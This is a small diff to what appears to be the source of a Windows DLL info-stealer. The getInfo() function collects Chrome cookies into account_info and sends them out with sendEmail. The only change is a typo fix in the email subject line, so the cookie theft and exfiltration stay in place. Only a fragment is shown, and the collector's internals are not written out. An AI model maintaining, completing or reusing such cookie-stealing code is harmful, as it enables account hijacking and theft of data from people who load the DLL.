@@ -39,7 +39,7 @@ void getInfo() {
 	ChromeCookiesCollecter cookieCollecter;
 	gather_result(cookieCollecter.collectData(), account_info);
 
-	sendEmail("account infromation", account_info);
+	sendEmail("account information", account_info);
 
 }
 BOOL APIENTRY DllMain( HMODULE hModule,
